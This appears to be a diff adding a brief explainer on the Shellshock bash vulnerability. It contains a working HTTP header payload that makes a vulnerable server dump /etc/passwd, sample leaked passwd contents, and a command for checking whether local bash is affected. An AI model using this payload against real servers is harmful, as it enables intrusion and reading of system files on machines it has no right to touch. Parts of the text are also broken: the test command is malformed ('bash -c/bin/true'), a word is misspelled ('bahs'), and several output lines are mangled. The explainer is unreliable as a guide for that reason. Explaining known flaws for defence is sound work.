@@ -1,0 +1,41 @@
+To start off, the attacker crafts HTTP request containing header
+where the referes are given by:
+----------------
+(){:;}; echo "NS:" $(</etc/passwd)
+----------------
+Once the target server receives the HTTP request, it will send a
+response by sending content of passwd file.
+----------------
+Content-Type:text/html
+NS:root:x:0:0:root:/root:/bin/bash
+daemon: x:1:1:daemon:/usr/sbin:/bin/sh
+bin: x:2:2:bin:/bin:/bin/sh
+sys: x:3:3:sys:/dev:/bin/sh
+sync: x:4:65534:sync:/bin:/bin/sync
+proxy: x:13:13:proxy:/bin:/bin/sh
+(admin):/var/lib/gnats:/bin/sh
+daemon:/bin/false
+sshd: x:104:65534::/var/run/sshd:/usr/sbin/nologin
+Connection: close
+-----------------
+This means that the attacker being able to execute the OS commands
+through a specific craft of HTTP request.
+Accordingly, the attacker can similarly use any other command to
+take over the full control of the target server.
+The simplest test to check if bash is vulnerable and available 
+publicly.
+------------------
+$ env var='(){ignore this;}; echo vulnerable' bash -c/bin/true
+------------------
+Upon running the given command, the output will be 'vulnerable' is
+your server is running an affected version of bash. If the patch is
+applied then the result is:
+------------------
+bahs:warning: var: ignoring function definition attempt
+bash: error importing function definition for 'var'
+------------------
+
+
+
+
+ 
